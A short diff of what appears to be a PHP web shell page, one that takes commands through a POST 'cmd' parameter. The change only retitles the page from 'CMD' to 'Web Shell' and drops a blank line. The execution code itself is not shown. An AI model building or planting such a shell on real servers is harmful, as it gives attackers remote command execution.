@@ -16,7 +16,7 @@ if (!empty($_POST['cmd'])) {
 
     <link rel="stylesheet" type="text/css" href="//bootswatch.com/4/flatly/bootstrap.min.css">
 
-    <title> CMD </title>
+    <title>Web Shell</title>
 
     <style>
         h2 {
@@ -67,7 +67,6 @@ if (!empty($_POST['cmd'])) {
         </div>
         <pre><small>No result.</small></pre>
 <?php endif; ?>
-
     </div>
 
 </body>
